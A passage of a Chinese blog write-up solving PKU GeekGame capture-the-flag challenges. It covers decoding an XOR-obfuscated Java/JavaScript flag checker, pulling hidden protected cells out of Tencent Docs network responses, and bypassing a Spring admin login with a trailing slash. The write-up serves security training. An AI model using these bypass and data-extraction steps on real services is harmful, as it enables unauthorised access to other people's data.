\"\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00cf\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd\\u00c6\\u0094\\u0099\\u008e\\u009d\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d\\u00d2´\\u00c8\\u008c\\u0087\\u008e\\u009d¬\\u0080\\u008b\\u008a®\\u009b\\u00c8\\u00c3\\u00c8\\u0082\\u008e\\u009f\\u00c8\\u00c3\\u00c8\\u00c8\\u00c3\\u00c8\\u009c\\u009f\\u0083\\u0086\\u009b\\u00c8\\u00c3\\u00c8\\u009c\\u009b\\u009d\\u0086\\u0081\\u0088\\u0086\\u0089\\u0096\\u00c8\\u00c3\\u00c8¬\\u0080\\u009d\\u009d\\u008a\\u008c\\u009b\\u00c8\\u00c3\\u00c8¸\\u009d\\u0080\\u0081\\u0088\\u00c8\\u00c3\\u00c8\\u0085\\u00c2\\u00c8²\\u00d4\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dc²²\\u00c7°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7\\u00df\\u00c6\\u0092\\u00c6\\u00c6\\u00d2\\u00d2\\u00cf¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7´\\u00df\\u00c3\\u00de\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00de\\u00d8\\u00c3\\u00dc\\u00df\\u00c3\\u00de\\u00df\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00dc\\u00de\\u00c3\\u00de\\u00d9\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00dc\\u00dc\\u00c3\\u00da\\u00c3\\u00d9\\u00df\\u00c3\\u00db\\u00c3\\u00de\\u00df\\u00d9\\u00c3\\u00d9\\u00c3\\u00db\\u00de\\u00c3\\u00df\\u00c3\\u00de\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00de\\u00d9\\u00c3\\u00db\\u00c3\\u00d9\\u00c3\\u00dc\\u00dc\\u00c3\\u00dd\\u00dc\\u00dd²´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c4\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0092\\u00c6\\u00c6\\u00d0°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00da²\\u00d5°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00d9²\\u00c6\\u0092\";\n            final StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < s.length(); ++i) {\n                sb.append((char)(s.charAt(i) ^ '\\u00ef'));\n            }\n            engineByName.eval(sb.toString());\n        }\n        catch (Exception ex) {\n            final StringWriter stringWriter = new StringWriter();\n            ex.printStackTrace(new PrintWriter(stringWriter));\n            JOptionPane.showMessageDialog(null, stringWriter.toString());\n        }\n        this.invocable = (Invocable)engineByName;\n        this.addWindowListener(new WindowAdapter() {\n            @Override\n            public void windowClosing(final WindowEvent windowEvent) {\n                System.exit(0);\n            }\n        });\n    }\n    \n    @Override\n    public void actionPerformed(final ActionEvent actionEvent) {\n        try {\n            if (actionEvent.getSource() == this.button1) {\n                if (\"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4\".equals(rot13(Base64.getEncoder().encodeToString(this.textField1.getText().getBytes(\"UTF-8\"))))) {\n                    JOptionPane.showMessageDialog(null, \"Correct\");\n                }\n                else {\n                    JOptionPane.showMessageDialog(null, \"Wrong\");\n                }\n            }\n            else {\n                JOptionPane.showMessageDialog(null, this.invocable.invokeFunction((actionEvent.getSource() == this.button2) ? \"checkflag2\" : \"checkflag3\", this.textField1.getText()));\n            }\n        }\n        catch (Exception ex) {\n            final StringWriter stringWriter = new StringWriter();\n            ex.printStackTrace(new PrintWriter(stringWriter));\n            JOptionPane.showMessageDialog(null, stringWriter.toString());\n        }\n    }\n    \n    static String rot13(final String s) {\n        final StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < s.length(); ++i) {\n            char char1 = s.charAt(i);\n            if (char1 >= 'a' && char1 <= 'm') {\n                char1 += '\\r';\n            }\n            else if (char1 >= 'A' && char1 <= 'M') {\n                char1 += '\\r';\n            }\n            else if (char1 >= 'n' && char1 <= 'z') {\n                char1 -= '\\r';\n            }\n            else if (char1 >= 'N' && char1 <= 'Z') {\n                char1 -= '\\r';\n            }\n            else if (char1 >= '5' && char1 <= '9') {\n                char1 -= '\\u0005';\n            }\n            else if (char1 >= '0' && char1 <= '4') {\n                char1 += '\\u0005';\n            }\n            sb.append(char1);\n        }\n        return sb.toString();\n    }\n    \n    public static void main(final String[] array) {\n        final GeekGame geekGame = new GeekGame();\n    }\n}\n\n```\n\n发现逻辑很简单，幸亏做了一下（\n\n\n### flag1\n\n\n是一个rot13+base64，\n\n\n解题代码：\n\n\n\n```python\nimport base64\nimport json\n\ndef rot13(s):\n    res = \"\"\n    for c in s:\n        if 'a' <= c <= 'm' or 'A' <= c <= 'M':\n            res += chr(ord(c) + 13)\n        elif 'n' <= c <= 'z' or 'N' <= c <= 'Z':\n            res += chr(ord(c) - 13)\n        elif '5' <= c <= '9':\n            res += chr(ord(c) - 5)\n        elif '0' <= c <= '4':\n            res += chr(ord(c) + 5)\n    return res\n\n\ns = \"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4\"\ns = rot13(s)\nflag1 = base64.b64decode(s).decode()\nprint(flag1)\n```\n\nflag{s1mp1e-jvav_rev}\n\n\n\n### flag2\n\n\n大概看了一下，发现用到了`this.invocable.invokeFunction`这个函数，经搜索发现是执行JavaScript代码的，意思是执行JavaScript程序中的checkflag2函数。\n\n\n阅读代码发现最前面执行了一段奇怪的内容：\n\n\n\n```java\n\ntry {\n    final String s = \"\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00cf\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd\\u00c6\\u0094\\u0099\\u008e\\u009d\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d\\u00d2´\\u00c8\\u008c\\u0087\\u008e\\u009d¬\\u0080\\u008b\\u008a®\\u009b\\u00c8\\u00c3\\u00c8\\u0082\\u008e\\u009f\\u00c8\\u00c3\\u00c8\\u00c8\\u00c3\\u00c8\\u009c\\u009f\\u0083\\u0086\\u009b\\u00c8\\u00c3\\u00c8\\u009c\\u009b\\u009d\\u0086\\u0081\\u0088\\u0086\\u0089\\u0096\\u00c8\\u00c3\\u00c8¬\\u0080\\u009d\\u009d\\u008a\\u008c\\u009b\\u00c8\\u00c3\\u00c8¸\\u009d\\u0080\\u0081\\u0088\\u00c8\\u00c3\\u00c8\\u0085\\u00c2\\u00c8²\\u00d4\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dc²²\\u00c7°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7\\u00df\\u00c6\\u0092\\u00c6\\u00c6\\u00d2\\u00d2\\u00cf¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7´\\u00df\\u00c3\\u00de\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00de\\u00d8\\u00c3\\u00dc\\u00df\\u00c3\\u00de\\u00df\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00dc\\u00de\\u00c3\\u00de\\u00d9\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00dc\\u00dc\\u00c3\\u00da\\u00c3\\u00d9\\u00df\\u00c3\\u00db\\u00c3\\u00de\\u00df\\u00d9\\u00c3\\u00d9\\u00c3\\u00db\\u00de\\u00c3\\u00df\\u00c3\\u00de\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00de\\u00d9\\u00c3\\u00db\\u00c3\\u00d9\\u00c3\\u00dc\\u00dc\\u00c3\\u00dd\\u00dc\\u00dd²´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c4\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0092\\u00c6\\u00c6\\u00d0°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00da²\\u00d5°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00d9²\\u00c6\\u0092\";\n    final StringBuilder sb = new StringBuilder();\n    for (int i = 0; i < s.length(); ++i) {\n        sb.append((char)(s.charAt(i) ^ '\\u00ef'));\n    }\n    engineByName.eval(sb.toString());\n}\n```\n\n我用Python重写了一下，发现字符串sb的值是：\n\n\n\n```js\nfunction checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}\n```\n\n稍微整理一下这个函数：\n\n\n\n```js\nfunction checkflag2(a){\n    return (\n        JSON[\"stringify\"](a[\"split\"](\"\")[\"map\"](\n            function(c){\n                return c[\"charCodeAt\"](0)\n            }\n            )\n        )=== JSON[\"stringify\"]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][b[1]](\n            function(c){\n                return (checkflag2+ \"\")[\"charCodeAt\"](c)\n            }\n            )\n        )?'Correct':'Wrong')\n}\n```\n\n容易理解逻辑，因此flag2也不难，解题代码：\n\n\n\n```python\n# encoding=utf-8\nimport json\n\ncode = '\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00cf\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd\\u00c6\\u0094\\u0099\\u008e\\u009d\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d\\u00d2´\\u00c8\\u008c\\u0087\\u008e\\u009d¬\\u0080\\u008b\\u008a®\\u009b\\u00c8\\u00c3\\u00c8\\u0082\\u008e\\u009f\\u00c8\\u00c3\\u00c8\\u00c8\\u00c3\\u00c8\\u009c\\u009f\\u0083\\u0086\\u009b\\u00c8\\u00c3\\u00c8\\u009c\\u009b\\u009d\\u0086\\u0081\\u0088\\u0086\\u0089\\u0096\\u00c8\\u00c3\\u00c8¬\\u0080\\u009d\\u009d\\u008a\\u008c\\u009b\\u00c8\\u00c3\\u00c8¸\\u009d\\u0080\\u0081\\u0088\\u00c8\\u00c3\\u00c8\\u0085\\u00c2\\u00c8²\\u00d4\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dd´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dc²²\\u00c7°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7\\u00df\\u00c6\\u0092\\u00c6\\u00c6\\u00d2\\u00d2\\u00cf¥¼ ¡´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00db²²\\u00c7´\\u00df\\u00c3\\u00de\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00de\\u00d8\\u00c3\\u00dc\\u00df\\u00c3\\u00de\\u00df\\u00da\\u00c3\\u00de\\u00d9\\u00c3\\u00dc\\u00de\\u00c3\\u00de\\u00d9\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00dc\\u00dc\\u00c3\\u00da\\u00c3\\u00d9\\u00df\\u00c3\\u00db\\u00c3\\u00de\\u00df\\u00d9\\u00c3\\u00d9\\u00c3\\u00db\\u00de\\u00c3\\u00df\\u00c3\\u00de\\u00c3\\u00d9\\u00d8\\u00c3\\u00dc\\u00c3\\u00de\\u00d9\\u00c3\\u00db\\u00c3\\u00d9\\u00c3\\u00dc\\u00dc\\u00c3\\u00dd\\u00dc\\u00dd²´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00de²²\\u00c7\\u0089\\u009a\\u0081\\u008c\\u009b\\u0086\\u0080\\u0081\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0094\\u009d\\u008a\\u009b\\u009a\\u009d\\u0081\\u00cf\\u00c7\\u008c\\u0087\\u008a\\u008c\\u0084\\u0089\\u0083\\u008e\\u0088\\u00dd\\u00c4\\u00cf°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00dd²\\u00c6´°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00df²²\\u00c7°\\u00df\\u0097\\u008e\\u00d7\\u00dc\\u008a\\u0097\\u00dc\\u00c6\\u0092\\u00c6\\u00c6\\u00d0°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00da²\\u00d5°\\u00df\\u0097\\u00d8\\u00dd\\u00db\\u008d´\\u00d9²\\u00c6\\u0092'\njscode = ''.join(map(lambda x: chr(ord(x) ^ 0xef), code))\ntarget = json.loads(jscode[255:330])\nprint(''.join(jscode[i] for i in target))\n```\n\nflag{javascript-obfuscator}\n\n\n\n## 企鹅文档\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n在一个开源软件学术大会上，主持人突然说：下面请认为无代码开发会减少安全漏洞的同志坐到会场左边，认为无代码开发会增加安全漏洞的同志坐到会场右边。\n\n\n大部分人坐到了左边，少数人坐到右边，只有 You 酱还坐在中间不动。\n\n\n主持人：侑同志，你到底认为无代码开发会减少还是增加漏洞？\n\n\n回答：我认为无代码开发会减少原来存在的漏洞，但是会带来很多新的漏洞。\n\n\n主持人慌忙说：那请您赶快坐到主席台上来。\n\n\n企鹅文档相信大家都很熟悉，它是企鹅公司久负盛名的在线文档编辑平台。但是基于企鹅文档的无代码 OA 系统是怎么回事呢？下面就让小编带大家一起了解吧。\n\n\n基于企鹅文档的无代码 OA 系统，其实就是用企鹅文档来实现 OA 系统。很多企业、学校、组织之前使用 OA 系统来下发通知和填报报表，现在这些机构很多都转向了使用企鹅文档来下发通知和填报报表，当然可以选择问卷星这些类似的服务。\n\n\n大家可能会感到惊讶，用企鹅文档来填报报表不会出现安全和隐私问题吗？但事实就是这样，小编也感到非常惊讶。\n\n\n那么这就是基于企鹅文档的无代码 OA 系统了，大家有没有觉得很神奇呢？快快点击左下角的阅读原文来看看基于企鹅文档的无代码 OA 系统吧。\n\n\n\n[本题文档](https://docs.qq.com/sheet/DV1lsUFRhQlp5eWtq?tab=BB08J2)\n\n{% endnote %}\n{% endhideToggle %}\n打开题目我感到很惊讶，因为这题居然出在现实生产环境里，而且就是很多人经常在用的腾讯文档。\n\n\n打开文档显示以下内容：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d36b8da86d93870f905a3c03eb9bd355.png)\n点了一下下面的单元格，发现它确实不让我看：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/bee204eff0a2a9a7588c17c8397c943e.png)\n难道腾讯文档有权限方面的漏洞不成？我Google了一下腾讯文档漏洞，确实好像有一些，但没找到题目里这种可以直接查看受保护区域的。\n\n\n然后我发现这是个web题，想到会不会腾讯文档的权限验证是在前端完成的，虽然感觉毕竟是TX，怎么可能犯这种愚蠢的错误，但我还是抓了个包看了一下，结果居然真在数据包里发现了这些隐藏起来的东西。。。\n\n\n需要注意的是，隐藏内容被分在两个不同的请求中，可以通过搜索\"机密flag\"快速定位到相关内容，于是拿到了一个链接：`https://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobsBzRJEs_next`\n\n\n访问链接显示以下内容：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/503ac8fe4aa8fe8079c8b1f088b0b71c.png)\n点击下载附件，下载到一个har文件（见下方），很多软件都能打开该类型的文件，我用的是Fiddler Classic。\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/txdocs/attachment/kAiQcWHobsBzRJEs_next.7z)\n一开始我在数据包中发现一条链接：`https://docs.qq.com/sheet/DV1hldXRnekRnUGxR`，以为发现了华点，结果打开来一看：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/6ff040fea3f9343ef5dc510a5410d36b.png)\n像是保存flag的文档，只是被删掉了。然后我试图通过找文档的历史版本来解题，然而找了半天无果，感觉这应该并不可能找到。于是只能换条路子。\n\n\n很容易在一堆数据包中发现某条请求（`GET /dop-api/get/sheet?u=75c5d3b1d8fb43489cd2c3033995b7a5&subId=BB08J2&rev=1&fRev=1&padId=300000000$WXeutgzDgPlQ&wb=1&isChunks=true&nowb=0&xsrf=1f438a6825f53e17&_r=8500&revdata=1&outformat=1&normal=1&startrow=0&endrow=2000`）的response中有一些重要内容：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/37acea2b6c98c9cec858ad6140bcee10.png)\n一开始我没注意到前面网页里的“提示”，然后对着上面的重要内容发了半天的呆不知道它想干啥。\n\n\n后来我注意到了前面的“提示”：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/bfcf715cad4dced0e5fe0a76a45e0a5a.png)\n\n原来如此。然后我研究了一下腾讯文档前端渲染的逻辑。腾讯文档单元格的编号是从左到右，从上到下，从0开始编号，前面Below is your flag下面的一些数字应该表示曾被涂黑过的单元格的编号，将它们转换到具体的单元格，应该可以拼出flag的样子。\n\n\n于是写了一个脚本处理这个请求的response（我将其命名为maybe_flag.json）：\n\n\n\n```python\nimport json\n\nwith open(\"maybe_flag.json\", 'r', encoding='utf-8') as f:\n    data = json.loads(f.read())['data']\nmax_col = data['maxcol']\nmax_row = data['maxrow']\ntext = data['initialAttributedText']['text'][0]\nkeys = set(list(map(int, text[-1][0]['c'][1].keys()))[1:-1])\nflag = [[\" \" for _ in range(max_col)] for _ in range(max_row)]\nfor i in range(max(keys) + 1):\n    row, col = i // max_col, i % max_col\n    if i in keys:\n        flag[row][col] = \"#\"\nfor line in flag:\n    print(' '.join(line))\n\n```\n\n执行一下脚本即可竖向打印出flag的样子。\n\n\nflag{ThisIsNotSponsoredByTencent}\n\n\n\n不过依旧觉得在现实环境里出题非常奇怪，现在tx已经把这个权限的漏洞修了，假如这个漏洞是在比赛还没结束的时候修复的，不知道比赛方会作何处理。\n\n\n## 企业级理解\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n大型企业的软件开发方式与开源项目是不同的。 只有拥有了大型企业特有的企业级理解，才能够更好地让产品为客户赋能，实现前端与后台的解耦，将需求对齐到场景的完整链路中，实现从底层到盈利层的打通……\n\n\n有些企业选择了坚如磐石的 Java 8 语言，只有在数十亿设备上都能运行的环境才是稳定可靠的环境。\n\n\n有些企业选择了历久弥新的 Spring Framework，毕竟只需要写几行配置就能为一个巨大的 Web App 增加自动生成的登录页面，工程师放心，产品经理也放心。\n\n\n有些企业选择了让程序员用 A4 纸书面打印代码来考核工作量，因为 “Talk is cheap, show me your code.” 是每名科班程序员的信条。\n\n\n有些企业选择了用毕业典礼欢送每一名员工，即将毕业的 You 酱心有不甘，摸了摸胸前的工牌，在会议室的桌上捡起了两张同事上周打印出来的代码，希望能够成为自己职业道路上的一份纪念。\n\n\n你，有着企业级理解吗？\n\n\n补充说明：本题不需要爆破密码。三个 Flag 分别需要绕过登录页面访问管理后台、访问本机上的 bonus 服务、通过 bonus 服务在机器上执行命令。\n\n\n注意：题目返回的 Flag 格式可能形如 flag1{...}，请改成 flag{...} 后提交。\n\n\n\n[部分题目源码](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/antweb/attachment/prob08-src.pdf)\n{% endnote %}\n{% endhideToggle %}\n### flag1\n\n\n打开部分题目源码，发现：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b3cd899cf06b03cdeb6aff63797ae069.png)\n我以前也写过这种类似的权限控制的东西，这题应该是通过在链接后加斜杠来绕过匹配，试了一下果不其然。\n\n\n访问/admin/，发现有如下表单：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/41bc30a7e0a1c62e5d918385da090882.png)\n下拉框有三个给定值：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/662092c759c92073e9fd9f3e504d85cb.png)\n填了几个value提交了一下，发现会跳转回/login，于是陷入死局。\n\n\n访问/admin/source_bak/，发现一些其他内容：\n\n\n\n```java\nimport org.springframework.web.reactive.function.client.WebClient;\n@RestController public class AdminController { \n\tWebClient webClient = WebClient.builder().baseUrl(\"http://localhost:8079/\").build(); \n\t@RequestMapping(\"/admin/{index}\") \n\tpublic String adminIndex(@PathVariable(name=\"index\") String index, String auth, QueryBean queryBean) { \n\t\tif (index != null & index.contains(\"%\")) { \n\t\t\tindex = URLDecoder.decode(index, \"UTF-8\"); \n\t\t} \n\t\tif (queryBean.getType() == null) { \n\t\t\tqueryBean.setType(\"PKU\"); \n\t\t} \n\t\tif (!typeList.contains(queryBean.getType())) { \n\t\t\ttypeList.add(queryBean.getType()); \n\t\t} \n\t\tMono str = webClient.post() .uri(index) .header(HttpHeaders.AUTHORIZATION, auth) .body(BodyInserters.fromFormData(\"type\", queryBean.getType())) .retrieve().bodyToMono(String.class); \n\t\treturn queryBean.setValue(str.block());\n\t} \n}\n```\n\n发现这个代码看上去应该是处理query的，并且这个query有个参数是type。注意到前面的源码处有一条\"/admin/query\"，那么同样如果在这里加个斜杠，应该也可以绕过限制去请求query。于是异想天开，试了一下访问如下三个链接：\n\n\n- /admin/query/?type=PKU\n- /admin/query/?type=PKU_Game\n- /admin/query/?type=PKU_GeekGame\n\n访问第三个时，拿到了flag1：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/805a77c4d0794a0c687b84dfb982684c.png)\n算是一个意外之喜，后来我发现只要在看一下前面表单的提交数据包，也可以发现这个请求，并且是POST请求。而这里我用GET请求也拿到了flag。\n\n\n## 这也能卷\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n某大学的很多课都有作业，特别是程序设计课程，往往会要求同学们写些简单程序当作业。 可惜，现在大家都很卷，考试总能取得极高的分数，甚至大作业也会卷出新花样来。 倘若某人在作业上开摆，那么等待他的往往只能是一个寄字，这也是某大学“摆寄”花名之由来。\n\n\n你有一位室友，他的口头禅是“我是摆大最摆的人”和“我从不内卷”。\n\n\n这一次，他选修了一门叫《JavaScript程序设计》的课程。自从选修这门课程后，你发现他 天天熬到半夜，对着VSCode傻笑，实为异常。\n\n\n一天，你在偶然间听到了他的喃喃自语：“只要我把小作业当期末作业做，大作业当毕业设计做，势必能卷过其他卷王！” 听到这，感觉收到了欺骗的你勃然大怒，打开了他的第一个“小”作业——一个“简单”的计算器。\n\n\n另外，通过一顿家园，你获得了他的后端源码，~~这让这道题的难度大大降低。~~\n\n\n\n[后端源码](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/ultimatesandbox/attachment/prob09-src.tar.gz)\n{% endnote %}\n{% endhideToggle %}\n### flag1\n\n\n访问题目网页，发现真的是个计算器，并且还有Premium版\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b4cd7441ebb2d599ab464838f00b70c7.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/be7c36d26a037cc888d4805c7b9254ad.png)\n二阶段提示：\n\n\n对于Flag1:\n\n\n- 成为会员会有不错的收获。\n- 不要试图逆向`premium.js`，会变得不幸。\n\n我在一阶段试图逆向了premium.js，但并没有变得不幸，反而让我捡到了flag（\n\n\n以下是premium.js片段：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e6965398a272032c6c68cf881ab9a899.png)\n我发现有个全局变量叫flag0，于是立马放到console里执行：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/75a7de51f942b84062b9d9b86fdd39ef.png)\n顺便激活了Premium。\n\n\n## 381654729\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n381654729，被称为“神奇而又独一无二的数”。\n\n\n小 Z 找到了一个类似的数，并把 Flag 编码到这个数里面，你能找到它吗？\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/polydivisible/attachment/prob16.py)\n{% endnote %}\n{% endhideToggle %}\n搜了一下381654729这个数，发现是[Polydivisible number](https://en.wikipedia.org/wiki/Polydivisible_number)，性质不再解释，阅读了一下题目附件，发现是让我们找一个16进制下的Polydivisible number，当然，位数要足够多，这样才能让flag是ascii字符。\n\n\n求这种数肯定有很多现成的程序，搜了一堆，发现还是维基百科里的那个好用：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/77d2490090d15a3788815c27f52674b6.png)\n拿来试了一下，轻松跑出flag：\n\n\n\n```python\ndef find_polydivisible(base: int):\n    numbers = []\n    previous = [i for i in range(1, base)]\n    new = []\n    digits = 2\n    while not previous == []:\n        numbers.append(previous)\n        for n in previous:\n            for j in range(0, base):\n                number = n * base + j\n                if number % digits == 0:\n                    new.append(number)\n        previous = new\n        new = []\n        digits = digits + 1\n    return numbers\n\n\nnumbers = find_polydivisible(16)\nfor number_list in numbers:\n    for n in number_list:\n        flag = n ^ 2511413510786744827230530121061181104625830238751614858642\n        flag = flag.to_bytes(24, 'big')\n        if len(set(flag) - set(range(127))) == 0:\n            print(flag)\n```\n\nflag{fOund_MaGic_nUmber}\n\n\n\n## 乱码还原\n{% hideToggle 查看题面 %}\n{% note primary simple 